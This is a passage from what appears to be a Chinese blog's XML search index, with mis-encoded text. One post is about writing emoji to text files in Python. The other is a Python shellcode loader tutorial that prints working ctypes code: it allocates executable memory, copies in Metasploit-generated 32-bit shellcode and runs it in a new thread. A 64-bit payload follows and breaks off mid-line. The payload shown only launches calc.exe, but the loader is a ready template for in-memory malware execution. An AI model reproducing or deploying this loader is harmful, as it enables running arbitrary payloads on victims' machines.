<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>python3 è¡¨æƒ…å­—ç¬¦å†™å…¥æ–‡æœ¬</title>
      <link href="/2021/12/07/python3-%E8%A1%A8%E6%83%85%E5%AD%97%E7%AC%A6%E5%86%99%E5%85%A5%E6%96%87%E6%9C%AC/"/>
      <url>/2021/12/07/python3-%E8%A1%A8%E6%83%85%E5%AD%97%E7%AC%A6%E5%86%99%E5%85%A5%E6%96%87%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h3 id="python3çˆ¬è™«é‡åˆ°emoji-è¡¨æƒ…å­—ç¬¦-æˆ–ç‰¹æ®Šå­—ç¬¦æ—¶-æ— æ³•å°†å­—ç¬¦å†™å…¥åˆ°æ–‡æœ¬æ–‡ä»¶ã€‚"><a href="#python3çˆ¬è™«é‡åˆ°emoji-è¡¨æƒ…å­—ç¬¦-æˆ–ç‰¹æ®Šå­—ç¬¦æ—¶-æ— æ³•å°†å­—ç¬¦å†™å…¥åˆ°æ–‡æœ¬æ–‡ä»¶ã€‚" class="headerlink" title="python3çˆ¬è™«é‡åˆ°emoji è¡¨æƒ…å­—ç¬¦ æˆ–ç‰¹æ®Šå­—ç¬¦æ—¶ æ— æ³•å°†å­—ç¬¦å†™å…¥åˆ°æ–‡æœ¬æ–‡ä»¶ã€‚"></a>python3çˆ¬è™«é‡åˆ°emoji è¡¨æƒ…å­—ç¬¦ æˆ–ç‰¹æ®Šå­—ç¬¦æ—¶ æ— æ³•å°†å­—ç¬¦å†™å…¥åˆ°æ–‡æœ¬æ–‡ä»¶ã€‚</h3><p>python2</p><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">dc</span>=&#x27;%uD<span class="hljs-number">83</span>C%uDF<span class="hljs-number">52</span>%uD<span class="hljs-number">83</span>C%uDF<span class="hljs-number">52</span>%<span class="hljs-number">20</span>%u<span class="hljs-number">5</span>C<span class="hljs-number">0</span>F%u<span class="hljs-number">6</span>A<span class="hljs-number">31</span>%u<span class="hljs-number">5</span>B<span class="hljs-number">50</span>&#x27; <br><span class="hljs-comment">#çˆ¬å–åˆ°çš„unicodeæ ¼å¼å­—ç¬¦ä¸²  åŸå‹(ğŸ’ğŸ’å°æ¨±å­)</span><br><br><span class="hljs-attribute">dc</span>=dc.replace(<span class="hljs-string">&quot;%&quot;</span>,<span class="hljs-string">&quot;\\&quot;</span>)#è½¬æ¢æ ¼å¼<br><span class="hljs-attribute">dc</span>=dc.decode(<span class="hljs-string">&quot;unicode_escape&quot;</span>)#unicode_escape   ç¼–ç é€‚åˆä½œä¸º ASCII ç¼–ç çš„ Python æºä»£ç ä¸­çš„ Unicode æ–‡å­—çš„å†…å®¹ï¼Œä½†å¼•å·ä¸ä¼šè¢«è½¬ä¹‰ã€‚ä» Latin-<span class="hljs-number">1</span> æºä»£ç è§£ç ã€‚<br><br><span class="hljs-attribute">dc</span>=dc.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><span class="hljs-attribute">with</span> open(<span class="hljs-string">&quot;1.txt&quot;</span>,&#x27;a+&#x27;) as f:<br><span class="hljs-attribute">f</span>.write(dc)<br></code></pre></td></tr></table></figure><hr><p>åŒæ ·çš„ä»£ç  å› ä¸ºpython2 ä¸ python3 çš„ä¸€äº›ç‰¹æ€§ å¯¼è‡´python3ä¸‹å†™å…¥æ–‡æœ¬å‡ºé”™ã€‚</p><p>åŸç†å¾ˆç®€å•,ç‰¹æ€§æœ‰ç‚¹çƒ¦äººã€‚</p><hr><p>python3</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">tmp=<span class="hljs-string">&#x27;%uD83C%uDF52%uD83C%uDF52%20%u5C0F%u6A31%u5B50&#x27;</span><br><br>tmp=tmp<span class="hljs-selector-class">.replace</span>(<span class="hljs-string">&quot;%&quot;</span>,<span class="hljs-string">&quot;\\&quot;</span>)<br>tmp=tmp<span class="hljs-selector-class">.encode</span>(<span class="hljs-string">&quot;latin_1&quot;</span>)<span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&quot;raw_unicode_escape&quot;</span>)<span class="hljs-selector-class">.encode</span>(<span class="hljs-string">&#x27;utf-16&#x27;</span>,<span class="hljs-string">&#x27;surrogatepass&#x27;</span>)<span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&#x27;utf-16&#x27;</span>,<span class="hljs-string">&#x27;surrogatepass&#x27;</span>)<span class="hljs-selector-class">.encode</span>(<span class="hljs-string">&quot;raw_unicode_escape&quot;</span>)<span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&quot;unicode_escape&quot;</span>)<br><br>with open(<span class="hljs-string">&quot;1.txt&quot;</span>,<span class="hljs-string">&#x27;a+&#x27;</span>,encoding=<span class="hljs-string">&quot;utf-16&quot;</span>) as f:<br>f<span class="hljs-selector-class">.write</span>(a)<br></code></pre></td></tr></table></figure><p>å†™å…¥æ–‡ä»¶çš„ç¼–ç è½¬æ¢é‡ç‚¹ä¸åœ¨äºç¼–ç ä¸Šçš„è½¬æ¢ï¼Œå†™å…¥æ–‡ä»¶æ‰“å¼€çš„é»˜è®¤ç¼–ç æ ¼å¼ä¹Ÿè¦æ³¨æ„ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python shellcode loader</title>
      <link href="/2021/11/06/python-shellcode-loader/"/>
      <url>/2021/11/06/python-shellcode-loader/</url>
      
        <content type="html"><![CDATA[<p>#python shellcode loader </p><p>ç¤ºåˆ—ä»£ç  32ä½ç¯å¢ƒ:</p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment">#python 3.7.0 32bit  </span><br><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># Metasploit windows/x86/exec calc.exe 32ä½payload</span><br><br><span class="hljs-keyword">import</span> ctypes<span class="hljs-comment">#åŠ è½½dllï¼ŒCæ•°æ®ç±»å‹ã€‚</span><br><br>buf =  <span class="hljs-string">b&quot;&quot;</span><br>buf += <span class="hljs-string">b&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30&quot;</span><br>buf += <span class="hljs-string">b&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;</span><br>buf += <span class="hljs-string">b&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&quot;</span><br>buf += <span class="hljs-string">b&quot;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&quot;</span><br>buf += <span class="hljs-string">b&quot;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&quot;</span><br>buf += <span class="hljs-string">b&quot;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&quot;</span><br>buf += <span class="hljs-string">b&quot;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&quot;</span><br>buf += <span class="hljs-string">b&quot;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&quot;</span><br>buf += <span class="hljs-string">b&quot;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&quot;</span><br>buf += <span class="hljs-string">b&quot;\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f&quot;</span><br>buf += <span class="hljs-string">b&quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5&quot;</span><br>buf += <span class="hljs-string">b&quot;\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a&quot;</span><br>buf += <span class="hljs-string">b&quot;\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span><br><br><br><span class="hljs-comment">#å°†å­—èŠ‚ç±»å‹payload  è½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„bytearray, </span><br>shellcode=<span class="hljs-built_in">bytearray</span>(buf)<br><br><br><span class="hljs-comment">#è°ƒç”¨VirtualAllocå‡½æ•°ï¼Œæ¥ç”³è¯·ä¸€å—åŠ¨æ€å†…å­˜åŒºåŸŸã€‚ </span><br>ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="hljs-number">0</span>), <span class="hljs-comment">#è¦åˆ†é…çš„å†…å­˜åŒºåŸŸçš„åœ°å€0æˆ–Noneä¸ºçº¿ç¨‹æŒ‡å‘,ä¹Ÿå¯æŒ‡å‘ä¸€ä¸ªæœªå ç”¨çš„å†…å­˜åœ°å€</span><br>                                          ctypes.c_int(<span class="hljs-built_in">len</span>(shellcode)),<span class="hljs-comment">#åˆ†é…çš„å¤§å°</span><br>                                          ctypes.c_int(<span class="hljs-number">0x3000</span>),<span class="hljs-comment">#åˆ†é…çš„ç±»å‹ ä¸ºåŸå‹0x1000 0x2000çš„åˆå¹¶  </span><br>                                          ctypes.c_int(<span class="hljs-number">0x40</span>))<span class="hljs-comment">#è¯¥å†…å­˜çš„åˆå§‹ä¿æŠ¤å±æ€§ å¯è¯»å¯å†™å¯æ‰§è¡Œ</span><br><span class="hljs-comment">#å°†shellcode æ”¾è¿›ç”³è¯·å†…å­˜ç©ºé—´ </span><br>buf = (ctypes.c_char * <span class="hljs-built_in">len</span>(shellcode)).from_buffer(shellcode)<br><br>ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),<span class="hljs-comment">#æŒ‡å‘ç§»åŠ¨ç›®çš„åœ°å€çš„æŒ‡é’ˆã€‚</span><br>                                     buf,<span class="hljs-comment">#æŒ‡å‘è¦å¤åˆ¶çš„å†…å­˜åœ°å€çš„æŒ‡é’ˆã€‚</span><br>                                     ctypes.c_int(<span class="hljs-built_in">len</span>(shellcode)))<span class="hljs-comment">#æŒ‡å®šè¦å¤åˆ¶çš„å­—èŠ‚æ•°ã€‚</span><br>                                     <br>                                     <br><span class="hljs-comment">#è°ƒç”¨CreateThreadå°†åœ¨ä¸»çº¿ç¨‹çš„åŸºç¡€ä¸Šåˆ›å»ºä¸€ä¸ªæ–°çº¿ç¨‹,åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ä»shellcodeæ”¾ç½®ä½ç½®å¼€å§‹æ‰§è¡Œ</span><br>ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="hljs-number">0</span>),<span class="hljs-comment">#çº¿ç¨‹å®‰å…¨å±æ€§</span><br>                                         ctypes.c_int(<span class="hljs-number">0</span>),<span class="hljs-comment">#ç½®åˆå§‹æ ˆçš„å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½</span><br>                                         ctypes.c_int(ptr),<span class="hljs-comment">#æŒ‡å‘çº¿ç¨‹å‡½æ•°çš„æŒ‡é’ˆ</span><br>                                         ctypes.c_int(<span class="hljs-number">0</span>),<span class="hljs-comment">#å‘çº¿ç¨‹å‡½æ•°ä¼ é€’çš„å‚æ•°</span><br>                                         ctypes.c_int(<span class="hljs-number">0</span>),<span class="hljs-comment">#çº¿ç¨‹åˆ›å»ºå±æ€§</span><br>                                         ctypes.pointer(ctypes.c_int(<span class="hljs-number">0</span>)))<span class="hljs-comment">#ä¿å­˜æ–°çº¿ç¨‹çš„id</span><br><br><span class="hljs-comment">#ç­‰å¾…åˆ›å»ºçš„çº¿ç¨‹è¿è¡Œç»“æŸ   ä¸€ä¸ªæ˜¯åˆ›å»ºçš„çº¿ç¨‹ï¼Œä¸€ä¸ªæ˜¯ç­‰å¾…æ—¶é—´  æ—¶é—´=-1 æ— é™ç­‰å¾…</span><br><br>ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-<span class="hljs-number">1</span>))<br><br></code></pre></td></tr></table></figure><p>å‚è€ƒæ¥è‡ªï¼š<br>XGå°åˆš <a href="https://mp.weixin.qq.com/s/-WcEW1aznO2IuCezkCe9HQ">https://mp.weixin.qq.com/s/-WcEW1aznO2IuCezkCe9HQ</a><br><a href="https://www.cnblogs.com/Akkuman/p/11851057.html">https://www.cnblogs.com/Akkuman/p/11851057.html</a><br>æ„Ÿè°¢ä¸¤ä½å¸…å“¥</p><p>ç®€å•æ¥è¯´ shellcodeæ˜¯ä¸€æ®µå¯æ‰§è¡Œçš„åå…­è¿›åˆ¶ä»£ç , åŠ è½½å™¨å°±æ˜¯ç”³è¯·ä¸€ç‰‡å¯è¯»å¯å†™å¯æ‰§è¡Œçš„å†…å­˜ç©ºé—´,å°†shellcode æ”¾è¿›ä¸€ä¸ªå†…å­˜ç©ºé—´,ä»shellcodeçš„å¤´éƒ¨å¼€å§‹æ‰§è¡Œã€‚å®ç°å°†shellcode æ‰§è¡Œçš„åŸç†ã€‚å¤§éƒ¨åˆ†è¯­è¨€çš„åŠ è½½å™¨éƒ½æ˜¯åŸºäºC çš„ â€œffiâ€(Foreign function interface   å¤–éƒ¨å‡½æ•°æ¥å£). åŸç†éƒ½æ˜¯ä¸€æ ·çš„ã€‚ä»¥è‡ªå·±ç›®å‰çš„è®¤çŸ¥æ¥çœ‹æ‰€è¿™æ ·çš„ã€‚ </p><hr><p>ä¸»è¦çš„ä»£ç :<br>ä»¥ä¸‹ä»£ç  æŸå¥è¯­å¥  ä¹Ÿå¯ç”¨å…¶ä»–æ–¹å¼æ‰§è¡Œshellcodeã€‚</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">kernel32<span class="hljs-selector-class">.dll</span> çš„VirtualAlloc å‡½æ•°ï¼Œç”³è¯·ä¸€å—å¯è¯»å¯å†™å¯æ‰§è¡Œçš„ç©ºé—´.<br>ctypes<span class="hljs-selector-class">.windll</span><span class="hljs-selector-class">.kernel32</span><span class="hljs-selector-class">.VirtualAlloc</span>   <br><br>kernel32<span class="hljs-selector-class">.dll</span> çš„RtlMoveMemory å°†shellcode æ”¾è¿›ç”³è¯·å¥½çš„ç©ºé—´<br>ctypes<span class="hljs-selector-class">.windll</span><span class="hljs-selector-class">.kernel32</span><span class="hljs-selector-class">.RtlMoveMemory</span><br><br>kernel32<span class="hljs-selector-class">.dll</span> çš„CreateThread åˆ›å»ºä¸€ä¸ªæ–°çš„çº¿ç¨‹,æ‰§è¡ŒæŒ‡å‘å†…å­˜ç©ºé—´çš„ä»£ç <br>ctypes<span class="hljs-selector-class">.windll</span><span class="hljs-selector-class">.kernel32</span><span class="hljs-selector-class">.CreateThread</span><br><br>ç­‰å¾…åˆ›å»ºçº¿ç¨‹ç»“æŸ<br>ctypes<span class="hljs-selector-class">.windll</span><span class="hljs-selector-class">.kernel32</span><span class="hljs-selector-class">.WaitForSingleObject</span><br><br></code></pre></td></tr></table></figure><hr><p>shellcodeçš„ç±»å‹è½¬æ¢ ä¹Ÿå¯é‡‡ç”¨ctypes.c_char_p(buf) çš„ç±»å‹ æ›¿ä»£ RtlMoveMemory æŒ‡å‘è¦å¤åˆ¶çš„å†…å­˜åœ°å€çš„æŒ‡é’ˆã€‚  æˆ–è€…shellcodeä¸è½¬æ¢ç±»å‹ä¹Ÿå¯ä»¥æˆåŠŸåŠ è½½ï¼Œè¿™ä¸€ç‚¹æœ‰ç‚¹ä¸ç†è§£ã€‚ RtlMoveMemory çš„å‚æ•°åº”è¯¥æ˜¯è¦å¤åˆ¶è¿‡å»çš„å†…å­˜çš„æŒ‡é’ˆåœ°å€, å¯æœªç¼–ç çš„shellcodeåªæ˜¯ä¸€ä¸²å­—èŠ‚ç±»å‹åå…­è¿›åˆ¶çš„codeã€‚ å¹¶æ²¡æœ‰æ˜ç¡®æŒ‡å‘åœ°å€,çœ‹RtlMoveMemoryçš„åŸå‹ä¹Ÿæ²¡çœ‹åˆ°è¿™ä¸€ç‚¹ï¼Œé™¤éè¿™ä¸€æ®µå£°æ˜çš„å˜é‡æ”¾å…¥çš„è¿‡ç¨‹ä¸­  æ˜¯ä¼šæŠŠåœ°å€é»˜è®¤åŠ è½½è¿‡å»ã€‚è¿™æ ·çš„è¯ ä¸‹é¢çš„ç±»å‹è½¬æ¢æ˜¯å¦æœ‰ç‚¹å¤šä½™ã€‚  </p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">shellcode</span>=bytearray(buf)<br><span class="hljs-attr">buf</span> = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)<br></code></pre></td></tr></table></figure><hr><p>ç¤ºåˆ—ä»£ç éœ€è¦åœ¨32ä½python3ç¯å¢ƒ å’Œ32ä½payload ä¸‹è¿è¡Œ,å¦åˆ™ä¼šå‡ºç°å†™å…¥è®¿é—®ä»çªçš„é”™è¯¯,è¯¥é”™è¯¯ ç”±äºVirtualAllocçš„é»˜è®¤è¿”å›ç±»å‹ä¸ä¸64ä¸ºå…¼å®¹å¼•å‘çš„é”™è¯¯<br>è®¾ç½®VirtualAllocè¿”å›ç±»å‹ä¸ºctypes.c_uint64<br>ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</p><hr><p>ä»¥ä¸‹æ˜¯64ä½ç¯å¢ƒçš„ç¤ºåˆ—ä»£ç ,å”¯ä¸€ä¸ä¸Šé¢ä¸åŒçš„å°±æ˜¯payloadä¸åŒ,æ•°æ®ç±»å‹ä¸ä¸€æ ·(ctypes.c_uint64):</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">import ctypes<br><br>shellcode =  b&quot;&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>fc<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>e4<span class="hljs-symbol">\x</span>f0<span class="hljs-symbol">\x</span>e8<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>51<span class="hljs-symbol">\x</span>41&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>51<span class="hljs-symbol">\x</span>56<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>d2<span class="hljs-symbol">\x</span>65<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>60<span class="hljs-symbol">\x</span>48&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>18<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>72<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>0f&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>b7<span class="hljs-symbol">\x</span>4a<span class="hljs-symbol">\x</span>4a<span class="hljs-symbol">\x</span>4d<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c9<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>ac<span class="hljs-symbol">\x</span>3c<span class="hljs-symbol">\x</span>61<span class="hljs-symbol">\x</span>7c&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>2c<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>c1<span class="hljs-symbol">\x</span>c9<span class="hljs-symbol">\x</span>0d<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>c1<span class="hljs-symbol">\x</span>e2<span class="hljs-symbol">\x</span>ed<span class="hljs-symbol">\x</span>52&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>51<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>42<span class="hljs-symbol">\x</span>3c<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>d0<span class="hljs-symbol">\x</span>8b&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>80<span class="hljs-symbol">\x</span>88<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>85<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>74<span class="hljs-symbol">\x</span>67<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>d0&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>18<span class="hljs-symbol">\x</span>44<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>40<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>49<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>d0<span class="hljs-symbol">\x</span>e3<span class="hljs-symbol">\x</span>56&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>c9<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>34<span class="hljs-symbol">\x</span>88<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>d6<span class="hljs-symbol">\x</span>4d<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c9&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>ac<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>c1<span class="hljs-symbol">\x</span>c9<span class="hljs-symbol">\x</span>0d<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>c1<span class="hljs-symbol">\x</span>38<span class="hljs-symbol">\x</span>e0&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>75<span class="hljs-symbol">\x</span>f1<span class="hljs-symbol">\x</span>4c<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>4c<span class="hljs-symbol">\x</span>24<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>45<span class="hljs-symbol">\x</span>39<span class="hljs-symbol">\x</span>d1<span class="hljs-symbol">\x</span>75<span class="hljs-symbol">\x</span>d8<span class="hljs-symbol">\x</span>58&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>44<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>40<span class="hljs-symbol">\x</span>24<span class="hljs-symbol">\x</span>49<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>d0<span class="hljs-symbol">\x</span>66<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>0c<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>44&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>40<span class="hljs-symbol">\x</span>1c<span class="hljs-symbol">\x</span>49<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>d0<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>88<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>d0&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>58<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>58<span class="hljs-symbol">\x</span>5e<span class="hljs-symbol">\x</span>59<span class="hljs-symbol">\x</span>5a<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>58<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>59<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>5a&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>ec<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>e0<span class="hljs-symbol">\x</span>58<span class="hljs-symbol">\x</span>41<span class="hljs-symbol">\x</span>59<span class="hljs-symbol">\x</span>5a<span class="hljs-symbol">\x</span>48&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>12<span class="hljs-symbol">\x</span>e9<span class="hljs-symbol">\x</span>57<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>5d<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>ba<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>8d<span class="hljs-symbol">\x</span>8d<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>41&quot;<br>shellcode += b&quot;<span class="hljs-symbol">\x</span>ba<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>6f<span 